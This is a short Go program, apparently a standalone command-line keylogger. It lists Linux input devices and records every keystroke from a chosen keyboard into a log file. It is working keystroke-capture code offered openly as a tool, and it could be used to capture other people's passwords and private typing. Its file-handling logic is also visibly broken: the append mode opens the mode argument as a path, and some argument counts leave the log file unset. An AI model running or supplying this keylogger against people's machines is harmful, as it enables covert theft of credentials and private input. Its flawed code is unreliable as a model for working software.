package main
import(
	"fmt"
	"log"
	"os"
	"strconv"
	"github.com/MarinX/keylogger"
)

func listDevices(){
	ndevices, err := keylogger.NewDevices()
	if err != nil {
		log.Fatal("Error:",err)
		return
	}
	for _, eachDev := range ndevices {
		fmt.Println("Id:", eachDev.Id,"Name:", eachDev.Name)
	}
}

func startLogging(){
//	Let's prepare the file
	var logfile *os.File
	var err error
	if len(os.Args)==5 {
		if os.Args[4]=="0"{
			logfile, err = os.Create(os.Args[3])
			if err != nil {
				panic(err)
			}
		} else {
		if _, err = os.Stat(os.Args[3]); err == nil {
 			logfile, err = os.Create(os.Args[3])
		} else {
		logfile, err = os.OpenFile(os.Args[4], os.O_APPEND|os.O_WRONLY, 0600)
			if err != nil {
				panic(err)
			}
		}
		}
	}
	defer logfile.Close()

	//I've got devices!
	ndevices, err := keylogger.NewDevices()
	//Index value to be set to keyboard, mind it!
	ind, _ := strconv.Atoi(os.Args[2])
	reader := keylogger.NewKeyLogger(ndevices[ind])
	input, err := reader.Read()
	if err!= nil {
		log.Fatal("Error:", err)
		return
	}

	for aStroke := range input {
	//listen only key stroke event

  	if aStroke.Type == keylogger.EV_KEY {
	//Get the key value
    	b := aStroke.KeyString()
	//Write it to the file
	if _, err = logfile.WriteString(b); err != nil {
    	panic(err)
	}
	}
	}
}

func printHelp(){
	fmt.Println("Available arguments are list and start")
	fmt.Println("Usage logging [list/start] [indexOfTheDevice logFilePath] [mode]")
	fmt.Println("Mode 0: To start over, Else: Append")
}

func main(){
//	args := os.Args
	if len(os.Args) < 2 {
		printHelp()
		return
	}
	if os.Args[1]=="list" {
		listDevices()
		return
	}
	if len(os.Args) < 4 {
		printHelp()
		return
	}
	if os.Args[1]=="start" {
		startLogging()
	} else {
		printHelp()
	}
}
